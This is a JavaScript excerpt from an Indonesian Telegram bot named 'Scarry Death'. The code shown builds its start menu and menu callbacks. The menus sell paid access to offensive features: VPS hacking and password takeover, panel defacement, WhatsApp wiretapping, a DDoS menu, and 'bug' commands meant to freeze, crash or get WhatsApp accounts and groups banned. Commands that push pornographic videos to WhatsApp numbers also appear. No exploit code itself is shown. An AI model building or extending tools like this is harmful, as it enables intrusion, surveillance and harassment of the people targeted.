    const username = msg.from?.username ? `@${msg.from.username}` : "Tidak ada username";

    let mode = "Public";
    try {
      const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE, "utf8"));
      mode = groupOnlyData.groupOnly ? "Grup Only" : "Public";
    } catch (e) {}

    const captionMenu = `
<blockquote>
${e1}<b>𝗦𝗖𝗔𝗥𝗥𝗬 𝗗𝗘𝗔𝗧𝗛 ── 𝗣𝗥𝗜𝗩𝗔𝗧𝗘 𝗘𝗗𝗜𝗧𝗜𝗢𝗡</b> ${e2}

"The shadows speak, and we listen." ${e3}
"Silent strikes, eternal echoes." ${e4}
"Scarry Death — New Version." ${e5}

${e6}Selamat datang di otoritas Scarry Death.
Bergerak dalam keheningan, menguasai tanpa jejak,
serta mendominasi dengan presisi mutlak.${e7}

${e8} Tetap waspada, tetap tak terlihat.
Pembalasan terbaik adalah eksekusi tanpa suara.${e9}

${e10}<b>𝗖𝗢𝗥𝗘 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗦𝗬𝗦𝗧𝗘𝗠</b>${e11}
${e12}System Name  : Scarry Death
${e13}Version      : 42.0 Pro
${e14}Developer    : @callmymell
${e15}Mode         : ${mode}
${e16}Date         : ${new Date().toLocaleDateString()}
${e17}Today        : ${date || "-"}
${e18} 𝗦𝗖𝗔𝗥𝗥𝗬 𝗗𝗘𝗔𝗧𝗛 ${e19} 𝙎𝙩𝙚𝙖𝙡𝙩𝙝 𝙈𝙤𝙙𝙚${e20} 𝘼𝙘𝙩𝙞𝙫𝙖𝙩𝙚𝙙${e21}
</blockquote>
`.trim();
      
    const buttonsMenu = {
      inline_keyboard: [
        [
          {
            text: "✦ 𝗕𝗨𝗚𝗦 𝗠𝗘𝗡𝗨 ✦",

      callback_data: "onlymurbug",

      style: "success",

      icon_custom_emoji_id: EMOJI.puzzle

    }

  ],

  [

    {

      text: "◁",

      callback_data: "toolsnew4",

      style: "primary",

      icon_custom_emoji_id: EMOJI.grin

    },

    {

      text: "⌂ 𝗛𝗢𝗠𝗘",

      callback_data: "mainmenu",

      style: "danger",

      icon_custom_emoji_id: EMOJI.alien

    },

    {

      text: "▷",

      callback_data: "settings",

      style: "primary",

      icon_custom_emoji_id: EMOJI.starBtn

    }

  ],

  [

    {

      text: "⚙️ 𝗦𝗘𝗧𝗧𝗜𝗡𝗚𝗦 𝗠𝗘𝗡𝗨",

      callback_data: "settings",

      style: "success",

      icon_custom_emoji_id: EMOJI.candy

    }

  ],

  // ⟦ ELITE ⟧ (SUCCESS)

  [

    { text: "⌬ 𝗧𝗢𝗢𝗟𝗦 ⟡ 𝗘𝗟𝗜𝗧𝗘", callback_data: "tools", style: "success", icon_custom_emoji_id: EMOJI.topStar },

    { text: "◈ 𝗠𝗢𝗡𝗜𝗧𝗢𝗥 ⟡ 𝗘𝗟𝗜𝗧𝗘", callback_data: "sadap", style: "success", icon_custom_emoji_id: EMOJI.glow },

    { text: "❖ 𝗦𝗘𝗦𝗦𝗜𝗢𝗡 ⟡ 𝗘𝗟𝗜𝗧𝗘", callback_data: "session", style: "success", icon_custom_emoji_id: EMOJI.cap }

  ],

  // ⟦ TOOLS VERSI ⟧ (PRIMARY)

  [

    { text: "⟐ 𝗧𝗢𝗢𝗟𝗦 ┃ 𝗩𝗘𝗥 Ⅱ", callback_data: "toolsv2", style: "primary", icon_custom_emoji_id: EMOJI.keyboard },

    { text: "⟐ 𝗧𝗢𝗢𝗟𝗦 ┃ 𝗩𝗘𝗥 Ⅲ", callback_data: "toolsv3", style: "primary", icon_custom_emoji_id: EMOJI.alphabet },

    { text: "⌕ 𝗦𝗘𝗔𝗥𝗖𝗛 ┃ 𝗩𝗘𝗥 Ⅳ", callback_data: "search", style: "primary", icon_custom_emoji_id: EMOJI.glow }

  ],

  [

    { text: "⛨ 𝗣𝗥𝗢𝗧𝗘𝗖𝗧 ┃ 𝗩𝗣𝗦", callback_data: "protection", style: "primary", icon_custom_emoji_id: EMOJI.shield || EMOJI.devil },

    { text: "⟐ 𝗧𝗢𝗢𝗟𝗦 ┃ 𝗩𝗘𝗥 Ⅴ", callback_data: "tools5", style: "primary", icon_custom_emoji_id: EMOJI.mushroom },

    { text: "⟐ 𝗧𝗢𝗢𝗟𝗦 ┃ 𝗩𝗘𝗥 Ⅵ", callback_data: "tools6", style: "primary", icon_custom_emoji_id: EMOJI.ghost }

  ],

  [

    { text: "⟐ 𝗧𝗢𝗢𝗟𝗦 ┃ 𝗩𝗘𝗥 Ⅶ", callback_data: "tools7", style: "primary", icon_custom_emoji_id: EMOJI.blackCat },

    { text: "⟐ 𝗧𝗢𝗢𝗟𝗦 ┃ 𝗩𝗘𝗥 Ⅷ", callback_data: "tools8", style: "primary", icon_custom_emoji_id: EMOJI.moon },

    { text: "⟡ 𝗚𝗔𝗖𝗛𝗔 ┃ 𝗠𝗘𝗡𝗨", callback_data: "gachaa", style: "primary", icon_custom_emoji_id: EMOJI.giftTop }

  ],

  // ⟦ FUN ⟧ (DANGER)

  [

    { text: "⌁ 𝗚𝗔𝗕𝗨𝗧 ┃ 𝗠𝗘𝗡𝗨", callback_data: "gabut", style: "danger", icon_custom_emoji_id: EMOJI.laugh },

    { text: "⌁ 𝗚𝗔𝗕𝗨𝗧 ┃ 𝗠𝗘𝗡𝗨 Ⅱ", callback_data: "gabutv2", style: "danger", icon_custom_emoji_id: EMOJI.candle1 },

    { text: "⟡ 𝗝𝗔𝗦𝗛𝗘𝗥 ┃ 𝗠𝗘𝗡𝗨", callback_data: "jasher", style: "danger", icon_custom_emoji_id: EMOJI.devil }

  ],

  [

    { text: "⟐ 𝗨𝗟𝗔𝗥 𝗧𝗔𝗡𝗚𝗚𝗔", callback_data: "ulartangga", style: "danger", icon_custom_emoji_id: EMOJI.snake || EMOJI.ghost },

    { text: "⬣ 𝗕𝗢𝗢𝗠 ┃ 𝗠𝗘𝗡𝗨", callback_data: "boom", style: "danger", icon_custom_emoji_id: EMOJI.skullBottom },

    { text: "✦ 𝗦𝗨𝗜𝗧 ┃ 𝗠𝗘𝗡𝗨", callback_data: "suit", style: "danger", icon_custom_emoji_id: EMOJI.knife }

  ],

  // ⟦ PANEL ⟧ (SUCCESS)

  [

    { text: "⟐ 𝗖𝗩𝗣𝗦 ┃ 𝗣𝗔𝗡𝗘𝗟", callback_data: "cvps", style: "success", icon_custom_emoji_id: EMOJI.topMedal },

    { text: "⟐ 𝗖𝗣𝗔𝗡𝗘𝗟 ┃ 𝗣𝗔𝗡𝗘𝗟", callback_data: "cpanel", style: "success", icon_custom_emoji_id: EMOJI.cap },

    { text: "⌕ 𝗗𝗗𝗢𝗦 ┃ 𝗠𝗘𝗡𝗨", callback_data: "ddos", style: "success", icon_custom_emoji_id: EMOJI.ghost }

  ],

  // ⟦ CONTROL ⟧ (PRIMARY)

  [

    { text: "⌬ 𝗖𝗢𝗡𝗧𝗥𝗢𝗟 ┃ 𝗕𝗢𝗧", callback_data: "ctrlbot", style: "primary", icon_custom_emoji_id: EMOJI.keyboard },

    { text: "⌁ 𝗔𝗦𝗨𝗣𝗔𝗡 ┃ 𝗠𝗘𝗡𝗨", callback_data: "asupan", style: "primary", icon_custom_emoji_id: EMOJI.rice },

    { text: "⟡ 𝗚𝗥𝗢𝗨𝗣 ┃ 𝗠𝗘𝗡𝗨", callback_data: "groupmenu", style: "primary", icon_custom_emoji_id: EMOJI.thumbs1 }

  ],

  [

    {

      text: "✚ 𝗔𝗗𝗗 𝗧𝗢 𝗚𝗥𝗢𝗨𝗣",

      url: "https://t.me/botscarrydeathh_bot?startgroup=true",

      style: "success",

      icon_custom_emoji_id: EMOJI.giftBottom

    }

  ],

  // ⟦ FOOTER ⟧

  [

    {

      text: "⌁ 𝗢𝗪𝗡𝗘𝗥",

      url: "https://t.me/ellysvinderellequen",

      style: "primary",

      icon_custom_emoji_id: EMOJI.thumbs2

    },

    {

      text: "⌁ 𝗖𝗛𝗔𝗡𝗡𝗘𝗟",

      url: "https://t.me/MakloehF",

      style: "primary",

      icon_custom_emoji_id: EMOJI.keyboard
          }
        ]
      ]
    };

    const customPP = getRandomImage();
    let menuSent = false;
    try {
      await bot.__scarryRichInstalled.sendMenu(chatId, captionMenu, buttonsMenu, customPP, {
        parse_mode: 'HTML',
        reply_to_message_id: msg.message_id
      });
      menuSent = true;
    } catch (err) {
      // Jangan kirim ulang saat hasil jaringan belum jelas: cegah duplikasi.
      console.error('[SCARRY START MENU]', String(err?.message || err).slice(0,180));
    }

    if (menuSent) {
      try {
        const privateEffectAudio = () => {
          return msg.chat.type === "private"
            ? { message_effect_id: "5159385139981059251" }
            : {};
        };

        await bot.sendAudio(
          chatId,
          fs.createReadStream("./SINGGLE ERA/scarry-eid.mp3"),
          {
            caption: `${e5} <blockquote>${e22} 𝗺ׅ𝘆ׂ𝗺ׅ𝗲ׅ𝐥${e22}</blockquote> ${e9}`,
            parse_mode: "HTML",
            title: "Scarry Death",
            performer: "@callmymell",
            ...privateEffectAudio()
          },
          {
            filename: "ScarryDeath-EidEdition.mp3",
            contentType: "audio/mpeg"
          }
        );
      } catch (e) {
        console.error("Gagal kirim audio start:", e?.response?.body || e?.message || e);
      }
    }

  } catch (e) {
    console.error("Error /start:", e?.response?.body || e?.message || e);
  }
});

const prem = (id, fallback) => `<tg-emoji emoji-id="${id}">${fallback}</tg-emoji>`;

// =========================
// PREMIUM EMOJI SESUAI URUTAN KAMU
// =========================
const EMOJI = {
  topMedal: "6258291392116691626",   // 🥇
  topStar: "4936468614967460670",    // ⭐
  candle1: "5190789872129962198",    // 🕯
  cap: "5424942942122964312",        // 🧢
  giftTop: "5280933624990955096",    // 🎁
  knife: "5267274641147183379",      // 🔪
  moon: "5267231541150369367",       // 🌙
  ghost: "5976451562229210124",      // 👻
  glow: "5350830008665400761",       // 💫
  mushroom: "5210694082019482951",   // 🍄
  thumbs1: "5350797680446567268",    // 👍
  alphabet: "5211102980085932649",   // 🔤
  giftVer: "5210848494683708519",    // 🎁
  giftDev: "5210818644661002233",    // 🎁
  blackCat: "5211187127085198061",   // 🐈‍⬛
  giftDate: "5211016122962304126",   // 🎁
  devil: "5267505950905878088",      // 😈
  rice: "5188256863627535342",       // 🍙
  candle2: "5190789872129962198",    // 🕯
  skullBottom: "5264872878255391549",// 💀
  giftBottom: "5197531888452925507", // 🎁

  // tombol
  puzzle: "5425077563577890102",     // 🧩
  alien: "6097933166008341599",      // 👾
  grin: "5190715139699010788",       // 😁
  starBtn: "5348425153397160578",    // 🌟
  candy: "5395471503603037530",      // 🍭
  thumbs2: "5463075238029848646",    // 👍
  keyboard: "5190500356974472463",   // ⌨
  laugh: "6100521570998948264",      // 😂
  mntb: "4956259055468282692",       // 💫
  mntb1: "4972059574430335804",       // 🔥
  mntb2: "6035353718684129368",       // 🔄
 mntb3: "5805523262691611326",       // ✅
 mntb4: "5474141032289441762",       // 📱
 mntb5: "5467836213572424390",       // 🍏
 mntb6: "5416081784641168838",       // 🟢
 mntb7: "4956395910306202687",       // 🔴
 mntb8: "5228740817337727023",       // 💡
};

// shortcut biar gampang
const e1  = prem(EMOJI.topMedal, "🥇");
const e2  = prem(EMOJI.topStar, "⭐");
const e3  = prem(EMOJI.candle1, "🕯");
const e4  = prem(EMOJI.cap, "🧢");
const e5  = prem(EMOJI.giftTop, "🎁");
const e6  = prem(EMOJI.knife, "🔪");
const e7  = prem(EMOJI.moon, "🌙");
const e8  = prem(EMOJI.ghost, "👻");
const e9  = prem(EMOJI.glow, "💫");
const e10 = prem(EMOJI.mushroom, "🍄");
const e11 = prem(EMOJI.thumbs1, "👍");
const e12 = prem(EMOJI.alphabet, "🔤");
const e13 = prem(EMOJI.giftVer, "🎁");
const e14 = prem(EMOJI.giftDev, "🎁");
const e15 = prem(EMOJI.blackCat, "🐈‍⬛");
const e16 = prem(EMOJI.giftDate, "🎁");
const e17 = prem(EMOJI.devil, "😈");
const e18 = prem(EMOJI.rice, "🍙");
const e19 = prem(EMOJI.candle2, "🕯");
const e20 = prem(EMOJI.skullBottom, "💀");
const e21 = prem(EMOJI.giftBottom, "🎁");
const e22 = prem(EMOJI.laugh, "😂");
//===================================
const raraa = prem(EMOJI.mntb, "💫");
const raraa1 = prem(EMOJI.mntb1, "🔥");
const raraa2 = prem(EMOJI.mntb2, "🔄");
const raraa3 = prem(EMOJI.mntb3, "✅");
const raraa4 = prem(EMOJI.mntb4, "📱");
const raraa5 = prem(EMOJI.mntb5, "🍏");
const raraa6 = prem(EMOJI.mntb6, "🟢");
const raraa7 = prem(EMOJI.mntb7, "🔴");
const raraa8 = prem(EMOJI.mntb8, "💡");
//===================================
// ===== Handler callback_query (full updated, tanpa console) =====
bot.on("callback_query", async (callbackQuery) => {
  try {
    if (!callbackQuery || !callbackQuery.data || !callbackQuery.message) return;

    const chatId = callbackQuery.message.chat.id;
    const messageId = callbackQuery.message.message_id;
    const data = callbackQuery.data;
    const senderId = callbackQuery.from.id;

    // 🔥 FIX UTAMA: HANDLE AUTOJOIN (JANGAN RETURN CEPAT)
    if (data && data.startsWith("AJVERIFY_")) {

      const ownerId = data.split("_")[1];

      // ❌ bukan pemilik tombol
      if (String(senderId) !== String(ownerId)) {
        return bot.answerCallbackQuery(callbackQuery.id, {
          text: "❌ Ini bukan tombol kamu!",
          show_alert: true
        });
      }

      const ok = await isUserJoinedAll(bot, senderId, autoJoinSettings.links);

      if (ok) {
        try {
          await bot.deleteMessage(chatId, messageId);
        } catch (e) {}

        await bot.sendMessage(chatId,
          `<blockquote>🎉 VERIFIKASI BERHASIL!\n🚀 Akses dibuka!</blockquote>`,
          { parse_mode: "HTML" }
        );
      } else {
        await bot.sendMessage(chatId,
          `<blockquote>⚠️ Kamu belum join semua channel!</blockquote>`,
          { parse_mode: "HTML" }
        );
      }

      return bot.answerCallbackQuery(callbackQuery.id);
    }

    // 🔥 CALLBACK NORMAL (MENU DLL)
    try {
      await bot.answerCallbackQuery(callbackQuery.id, { show_alert: false });
    } catch (ignore) {}

    const username = callbackQuery.from.username ? `@${callbackQuery.from.username}` : "Tidak ada username";

    const senderCounts = (typeof getSenderCounts === "function")
      ? getSenderCounts()
      : { connected: 0, disconnected: 0, total: 0 };

    const menuText = `
» Sender Terhubung : ${senderCounts.connected}
» Sender Tidak Terhubung : ${senderCounts.disconnected}
» Total Sender : ${senderCounts.total}
`;

    // ✅ SAFE FUNCTION
    const runtime = (typeof getBotRuntime === "function") ? getBotRuntime() : "";
    const memoryStatus = (typeof formatMemory === "function") ? formatMemory() : "";
    const date = (typeof getCurrentDate === "function") ? getCurrentDate() : "";

    let mode = "Public";
    try {
      const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE, "utf8"));
      mode = groupOnlyData.groupOnly ? "Grup Only" : "Public";
    } catch (e) {}

    if (isTooFrequent(chatId, data, 1.2)) {
      try {
        await bot.answerCallbackQuery(callbackQuery.id, {
          text: "Tunggu sebentar...",
          show_alert: false
        });
      } catch (ignore) {}
      return;
    }

    let newCaption = "";
    let newButtons = [];
    let newParseMode = "HTML";

    const customMed = {
      type: "photo",
      media: getRandomImage()
    };

    // set newCaption & newButtons berdasarkan data
   if (data === "murbug2" || data === "murbug") {
    // Legacy inline buttons now open the new BUGS MENU navigation.
    newCaption = 'BUGS MENU';
    newButtons = [
      [{ text: "🛡️ BUGS ANTI KENON", callback_data: "scarry_bug_anti", style: "success", icon_custom_emoji_id: EMOJI.cap }],
      [{ text: "⚠️ BUGS RAWAN BAND", callback_data: "scarry_bug_rawan", style: "danger", icon_custom_emoji_id: EMOJI.cap }],
      [{ text: "👥 BUGS GROUP ONLY", callback_data: "scarry_bug_group", style: "primary", icon_custom_emoji_id: EMOJI.thumbs1 }],
      [{ text: "⌂ HOME", callback_data: "mainmenu", style: "danger", icon_custom_emoji_id: EMOJI.alien }]
    ];

  } else if (data === "settings") {
    newCaption = ` 
<blockquote>
#- 𝘚 𝘌 𝘛 𝘛 𝘐 𝘕 𝘎  𝘖 𝘞 𝘕 𝘌 𝘙  -  𝘔 𝘌 𝘕 𝘜

"一緒 Setting Menu Scarry ᯤ",
${raraa1} /autojoin on / off - [COCOK BUAT PUSH CH / GROUP MUU]
${raraa1} /setautojoin - [MASUKKAN LINK MU SUPPORT MULTI LINK CH / GROUP BAHKAN BISA 30an]
${raraa1} /risetjoin - [RESET DELETE LINK AUTO JOIN]
${raraa1} /listjoin - [MELIHAT LINK AUTO JOIN ON/OFF]
${raraa1} /addgroup - [ADD ALL MEMB KE AKSES PREMIUM SEMUA]
${raraa1} /delgroup - [DELETE ALL AKSES PREMIUM GROUP]
${raraa1} /aktifall - [MENGAKTIFKAN SEMUA COMMAND]
${raraa1} /resetall - [MENGHAPUS SEMUA COMMAND AKTIF]
${raraa1} /listgroup - [MENAMPILKAN LIST GROUP YANG DI IZINKAN PREMIUM]
${raraa1} /addprem - [ADD PREMIUM USER]
${raraa1} /delprem - [DELETE PREMIUM USER]
${raraa1} /addadmin - [ADD ADMIN USER]
${raraa1} /deladmin - [DELETE ADMIN USER]
${raraa1} /listprem - [LIST USER PREMIUM]
${raraa1} /setjeda 1m - [SET COLDOWN]
${raraa1} /gruponly - [ON|OFF]
${raraa1} /addsender 628xx - [ADDSENDER NUMBER]
${raraa1} /killsession - [DELETE SENDER SESSSION]
</blockquote>
`;
    newButtons = [
  [
    {
      text: "◁",
      callback_data: "mainmenu",
      style: "primary",
      icon_custom_emoji_id: EMOJI.grin
    },
    {
      text: "▷",
      callback_data: "toolsnew",
      style: "success",
      icon_custom_emoji_id: EMOJI.starBtn
    }
  ],
  [
    {
      text: "↺",
      callback_data: "mainmenu",
      style: "danger",
      icon_custom_emoji_id: EMOJI.puzzle
    }
  ]
];

  } else if (data === "infosc") {
    newCaption = `
<blockquote>
༄『 𝗜 𝗡 𝗙 𝗢 𝗥 𝗠 𝗔 𝗦 𝗜 』- 𝗦 𝗖 𝗥 𝗜 𝗣 𝗧 ⚡

${raraa1} 𝗡𝗔𝗠𝗘 𝗕𝗢𝗧       : "SCARRY DEATH"
${raraa1} 𝗕𝗢𝗧 𝗦𝗧𝗔𝗧𝗨𝗦     : "ONLINE"
${raraa1} 𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘       : "${username}"
${raraa1} 𝗨𝗦𝗘𝗥 𝗜𝗗        : "${chatId}"
${raraa1} 𝗦𝗘𝗡𝗗𝗘𝗥 𝗦𝗧𝗔𝗧𝗘   : "ACTIVE"
${raraa1} 𝗨𝗣𝗧𝗜𝗠𝗘         : "${runtime}"

༒ SECURITY MODULE ༒
${raraa1} ANTIBYPASS SYSTEM  : "ACTIVE"
${raraa1} TOKEN VERIFICATION : "ENABLED"

${raraa1} 𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥 : "@elyssavirellequeenn"
${raraa1} 𝗩𝗘𝗥𝗦𝗜𝗢𝗡   : "Latest"
${raraa1} 𝗧𝗬𝗣𝗘      : "Auto Update"

🌀 𝗕𝗘𝗕𝗔𝗦 𝗦𝗣𝗔𝗠 𝗠𝗨𝗥𝗕𝗨𝗚 : Cocok Buat Nokos Fresh / Gacha

${raraa} 𝗙𝗨𝗟𝗟 𝗨𝗣𝗗𝗔𝗧𝗘 : "25.000"
${raraa} 𝗥𝗘𝗦𝗘𝗟𝗟𝗘𝗥    : "50.000"
${raraa} 𝗣𝗔𝗥𝗧𝗡𝗘𝗥     : "80.000"
${raraa} 𝗠𝗢𝗗𝗘𝗥𝗔𝗧𝗢𝗥   : "120.000"
${raraa} 𝗖𝗘𝗢         : "150.000"
${raraa} 𝗢𝗪𝗡𝗘𝗥       : "180.000"
${raraa} 𝗦𝗩𝗜𝗣        : "250.000"
${raraa} 𝗩𝗩𝗜𝗣        : "300.000"
${raraa} 𝗘𝗫𝗘𝗖𝗨𝗧𝗢𝗥𝗩𝗜𝗣 : "400.000"

༄════════════════༄
</blockquote>
`;
    newButtons = [
  [
    {
      text: "◁",
      callback_data: "mainmenu",
      style: "primary",
      icon_custom_emoji_id: EMOJI.grin
    },
    {
      text: "▷",
      callback_data: "settings",
      style: "success",
      icon_custom_emoji_id: EMOJI.starBtn
    }
  ],
  [
    {
      text: "↺",
      callback_data: "mainmenu",
      style: "danger",
      icon_custom_emoji_id: EMOJI.puzzle
    }
  ]
];

  } else if (data === "toolsnew") {
    newCaption = ` 
<blockquote>
 #- 𝘛 𝘖 𝘖 𝘓 𝘚  𝘕 𝘌 𝘞  -  𝘔 𝘌 𝘕 𝘜

"一緒 Tools Menu #1 ᯤ";
${raraa} /hackvps - [HACK DATA VPS IN PLACE]
${raraa} /loginvps - [LOGIN VPS UNTUK MENGUBAH PASSWORD]
${raraa} /deface - [DEFACE DOMAIN PANEL TARGET]
${raraa} /wa_on - [AKTIFKAN SADAP WA SENDER]
${raraa} /wa_off - [MEMATIKAN SADAP SENDER]
${raraa} /kirimpesan - [NUMBER SENDER NUMBER TARGET PESAN]
${raraa} /cekwa 628xx - [GET INFO PP & BIO TARGET]
${raraa} /sbrat - [MEMBUAT STIKER TEXT BRAT]
${raraa} /qc - [MEMBUAT QC STIKER]
${raraa} /hardenc - [ENCRYPT HARD FILE .JS]
${raraa} /tourl - [MENGUBAH FOTO JADI LINK]
${raraa} /cekkhodam - [CEK KHODAM KAMU]
${raraa} /cekpacar - [TES KEPACARAN BRP %]
${raraa} /cekjanda - [CEK JANDA BRP %]
${raraa} /cekkaya - [CEK KAYA BRP %]
${raraa} /cekmiskin - [CEK MISKIN BRP %]
${raraa} /iqc - [MEMBUAT SS MIRIP IPHONE]
${raraa} /play - [ISI JUDUL MUSIC UNTUK PLAY]
${raraa} /cekerror - [REPLAY FILE CHECK ERROR CODE JS]
${raraa} /cadp - [DOMAIN,PLTA,PLTC]
${raraa} /eksekusi nama - [MELAKUKAN PENGAMBILAN SEBDER DI ADP]
${raraa} /listadp - [MENAMPILKAN LIST ADP]
${raraa} /artinama - [MASUKAN NAMAMU]
${raraa} /neko - [GENERATION RANDOM IMAGE NEKO]
${raraa} /animequote - [GET EPSD ANIME QUOTE]
</blockquote>
`;
    newButtons = [
  [
    {
      text: "◁",
      callback_data: "settings",
      style: "primary",
      icon_custom_emoji_id: EMOJI.grin
    },
    {
      text: "▷",
      callback_data: "toolsnew2",
      style: "success",
      icon_custom_emoji_id: EMOJI.starBtn
    }
  ],
  [
    {
      text: "↺",
      callback_data: "mainmenu",
      style: "danger",
      icon_custom_emoji_id: EMOJI.puzzle
    }
  ]
];

  } else if (data === "toolsnew2") {
    newCaption = `        
 <blockquote>
 #- 𝘛 𝘖 𝘖 𝘓 𝘚  𝘕 𝘌 𝘞  -  𝘔 𝘌 𝘕 𝘜

"一緒 Tools Menu #2 ᯤ",
${raraa} /setpanel  
➜ Menambahkan PLTA & PLTC secara otomatis (tanpa setting manual)
${raraa} /listpanel  
➜ Menampilkan semua daftar panel (PLTA & PLTC) yang tersimpan
${raraa} /delpanel  
➜ Menghapus panel dari daftar (berdasarkan nomor)
${raraa} /1gb - nama  
➜ Membuat server (tersedia 1GB - UNLI)
${raraa} /listserver  
➜ Menampilkan semua server yang tersimpan
${raraa} /delserver  
➜ Menghapus server user (pilih via button)
${raraa} /cadp - nama  
➜ Membuat admin panel otomatis
${raraa} /addadmin id  
➜ Menambahkan akses admin panel ke user
${raraa} /addprem id days  
➜ Memberikan akses premium user (1GB - UNLI)
${raraa} /addgroup days  
➜ Memberikan akses premium semua member group sekaligus
</blockquote>
`;
    newButtons = [
  [
    {
      text: "◁",
      callback_data: "toolsnew",
      style: "primary",
      icon_custom_emoji_id: EMOJI.grin
    },
    {
      text: "▷",
      callback_data: "toolsnew3",
      style: "success",
      icon_custom_emoji_id: EMOJI.starBtn
    }
  ],
  [
    {
      text: "↺",
      callback_data: "mainmenu",
      style: "danger",
      icon_custom_emoji_id: EMOJI.puzzle
    }
  ]
];

  } else if (data === "toolsnew3") {
    newCaption = `        
 <blockquote>
 #- 𝘛 𝘖 𝘖 𝘓 𝘚  𝘕 𝘌 𝘞  -  𝘔 𝘌 𝘕 𝘜

"一緒 Tools Menu #3 ᯤ",
${raraa} /cekjoingroup - [CEK BOT JOIN GROUP]
${raraa} /ceklink id - [GET LINK DARI ID TERSEBUT]
${raraa} /outallgroup - [OUT SEMUA GROUP KECUALI YANG DI PERINTAHKAN]
${raraa} /cekagama - [REPLAY PESAN USER]
${raraa} /setlink - [@USERNAME BISA GROUP ATAU CH]
${raraa} /additem - [REPLAY FILE ITEMNYA BUAT DI ADD DI GACHA]
${raraa} /listitem - [MENAMPILKAN NOMOR LIST ITEM]
${raraa} /delitem - [NOMER ITEM YANG AKAN DI DELETE]
${raraa} /gacha - [USER HARUS JOIN KE @USERNAME YANG KAMU SET SEBELUM MENGGUNAKAN PERINTAH INI]
${raraa} /cekganteng - [CEK SEBERAPA KAMU GANTENG]
${raraa} /cekcantik - [CEK SEBERAPA KAMU CANTIK]
${raraa} /ceknontonbokep - [CEK SEBERAPA NONTON BOKEP]
${raraa} /tebakmasadepan - [TEBAK MASA DEPAN KAMU]
${raraa} /cektolol - [CEK SEBERAPA KAMU TOLOL]
</blockquote>
`;
    newButtons = [
  [
    {
      text: "◁",
      callback_data: "toolsnew2",
      style: "primary",
      icon_custom_emoji_id: EMOJI.grin
    },
    {
      text: "▷",
      callback_data: "toolsnew4",
      style: "success",
      icon_custom_emoji_id: EMOJI.starBtn
    }
  ],
  [
    {
      text: "↺",
      callback_data: "mainmenu",
      style: "danger",
      icon_custom_emoji_id: EMOJI.puzzle
    }
  ]
];

  } else if (data === "toolsnew4") {
    newCaption = `
<blockquote>
 #- 𝘛 𝘖 𝘖 𝘓 𝘚  𝘕 𝘌 𝘞  -  𝘔 𝘌 𝘕 𝘜

"一緒 Tools Menu #4 ᯤ",
${raraa} /bokepsendwa 628xxx jumlah - [SEND BOKEP KE WA]
${raraa} /autosendbokep jumlah - [SEND BOKEP RANDOM SESUAI JUMLAH]
${raraa} /sendbokep - [GET RANDOM VIDEO 18+]
${raraa} /indonesia - [GET RANDOM IMAGE CECAN INDO]
${raraa} /japan - [GET RANDOM IMAGE CECAN JAPAN]
${raraa} /korea - [GET RANDOM IMAGE CECAN KOREA]
${raraa} /china - [GET RANDOM IMAGE CECAN CHINA]
${raraa} /vietnam - [GET RANDOM IMAGE VIETNAM]
${raraa} /thailand - [GET RANDOM IMAGE THAILAND]
${raraa} /installprotectall ipvps|pwvps - [INSTALL PROTECT ANTI RUSUH PANEL]
${raraa} /ulartangga - [UNTUK MENAMPILKAN ALL MENU]
${raraa} /createroom - [UNTUK MEMBUAT ROOM ULAR TANGGA BUAT MABAR]
${raraa} /join - [UNTUK BERGABUNG KE ROOM MAX 10 PEMAIN]
${raraa} /letsgo - [UNTUK MEMULAI PERMAINAN ULAR TANGGA]
${raraa} /dadu - [UNTUK MENGOCOK DADU PAS GILIRANMU]
${raraa} /exit - [UNTUK MENGHAPUS ROOM ULAR TANGGA YANG DI BUAT]
</blockquote>
`;
    newButtons = [
  [
    {
      text: "◁",
      callback_data: "toolsnew2",
      style: "primary",
      icon_custom_emoji_id: EMOJI.grin
    },
    {
      text: "▷",
      callback_data: "toolsnew4",
      style: "success",
      icon_custom_emoji_id: EMOJI.starBtn
    }
  ],
  [
    {
      text: "↺",
      callback_data: "mainmenu",
      style: "danger",
      icon_custom_emoji_id: EMOJI.puzzle
    }
  ]
];

  } else if (data === "onlymurbug") {
    newCaption = 'BUGS MENU';
    newButtons = [
      [{ text: "🛡️ BUGS ANTI KENON", callback_data: "scarry_bug_anti", style: "success", icon_custom_emoji_id: EMOJI.cap }],
      [{ text: "⚠️ BUGS RAWAN BAND", callback_data: "scarry_bug_rawan", style: "danger", icon_custom_emoji_id: EMOJI.cap }],
      [{ text: "👥 BUGS GROUP ONLY", callback_data: "scarry_bug_group", style: "primary", icon_custom_emoji_id: EMOJI.thumbs1 }],
      [{ text: "⌂ HOME", callback_data: "mainmenu", style: "danger", icon_custom_emoji_id: EMOJI.alien }]
    ];

  } else if (["scarry_bug_anti", "scarry_bug_rawan", "scarry_bug_group"].includes(data)) {
    // Navigasi kategori hanya untuk tampilan: tombol tidak memicu pengiriman payload.
    const categoryCaption = {
      scarry_bug_anti: [
        'BUGS ANTI KENON MENU',
        ...SCARRY_ANTI_COMMANDS.filter(command => command !== '').map(command => `${command}  +628xxx  ANTI BANNED 100%`)
      ].join('\n'),
      scarry_bug_rawan: 'BUGS RAWAN BAND MENU\n/lockchat\n/banindo',
      scarry_bug_group: `BUGS GROUP ONLY MENU
/frezegc - Group
/blankgc - Group
/fcgc - Group
/lockgc - Group`    
    };
    newCaption = categoryCaption[data];
    newButtons = [
      [{ text: "↩️ BUGS MENU", callback_data: "onlymurbug", style: "primary", icon_custom_emoji_id: EMOJI.puzzle }],
      [{ text: "⌂ HOME", callback_data: "mainmenu", style: "danger", icon_custom_emoji_id: EMOJI.alien }]
    ];

  } else if (data === "session") {
    newCaption = `
<blockquote>
「 ꜱᴇꜱꜱɪᴏɴ × ᴍᴇɴᴜ 」
 ‪‪${raraa} /cadp - nama plta,pltc,domain
 ${raraa} /eksekusi - nama
 ${raraa} /listadp - menampilkan list
 ${raraa} /deladp - nama
</blockquote>
`;
    newButtons = [
  [
    {
      text: "༄ ･ ｡ﾟ☆ 𝗞𝗘𝗠𝗕𝗔𝗟𝗜 ☆ﾟ｡･ ༄",
      callback_data: "mainmenu",
      style: "danger",
      icon_custom_emoji_id: EMOJI.puzzle
    }
  ]
];

  } else if (data === "sadap") {
    newCaption = `        
<blockquote>
「 ᴡʜᴀᴛꜱᴀᴘᴘ × ᴍᴇɴᴜ 」
 ${raraa} /wa_on - aktifkan sadap whatsapp
 ${raraa} /wa_off - mematikan sadap
